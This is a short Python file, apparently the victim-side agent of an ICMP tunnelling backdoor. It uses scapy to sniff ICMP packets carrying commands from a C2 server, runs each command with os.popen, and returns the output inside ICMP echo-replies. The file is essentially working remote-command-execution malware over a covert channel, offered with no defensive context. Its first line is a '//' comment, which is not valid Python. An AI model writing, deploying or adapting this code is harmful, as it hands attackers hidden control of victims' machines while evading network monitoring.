
// cliet/victim side code to exploit with icmp telig ..

import os
from scapy.all import *


def main():
    while True:
        # waitig for the ICMP message containing the command from the C2 server
        # to be received
        pack_sniff = sniff(filter="icmp", count=1)
        
        var = pack_sniff[0][Raw].load.decode('utf-8')
        
        res = os.popen(var).read()
       
        send(IP(dst="localhost")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)

		
if __name__ == "__main__":
    main()
